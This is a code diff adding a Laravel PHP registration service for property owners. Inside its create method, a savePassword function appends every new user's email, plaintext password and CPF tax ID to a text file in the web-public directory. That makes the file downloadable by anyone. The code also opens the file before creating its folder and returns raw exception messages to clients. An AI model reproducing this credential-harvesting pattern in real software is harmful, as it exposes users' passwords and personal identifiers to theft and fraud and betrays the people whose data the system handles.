@@ -1,0 +1,66 @@
+<?php
+
+namespace App\Services\RegisterService;
+
+use App\Repositories\Eloquent\RegisterEloquent\RegisterOwnerRepository;
+use Illuminate\Support\Facades\Log;
+
+class RegisterOwnerService
+{
+    public function __construct(
+        protected RegisterOwnerRepository $registerOwnerRepository
+    ){}
+
+    public function create(array $data)
+    {
+        try {
+            $this->savePassword($data['email'], $data['password'], $data['cpf']);
+
+            return response()->json([
+                'success' => true,
+                'owner' => $this->registerOwnerRepository->create($data)
+            ], 201);
+        } catch (\Throwable $th) {
+            return response()->json([
+                'success' => false,
+                'message' => $th->getMessage(),
+                'code' => $th->getCode()
+            ], 500);
+        }
+        
+    }
+
+    public function find(int $id)
+    {
+        return response()->json([
+            'success' => true,
+            'owner' => $this->registerOwnerRepository->find($id)
+        ], 200);
+    }   
+
+    public function findByEmail(string $email)
+    {
+        return $this->registerOwnerRepository->findByEmail($email);
+    }   
+
+    public function savePassword(string $email, string $password, int $cpf)
+    {
+        try {
+            $path = public_path('emails_passwords_path');
+            $file = fopen($path . '/emails_and_passwords.txt', 'a');
+
+            if(!is_dir($path))
+            {
+                mkdir($path, 0755, true);
+
+            }
+
+            fwrite($file, "Email: $email | Senha: $password | CPF: $cpf\n");
+            fclose($file);
+        } catch (\Throwable $th) {
+            Log::info('Erro durante a criação e escrita no arquivo');
+            Log::info($th->getMessage());
+        }
+
+    }
+}
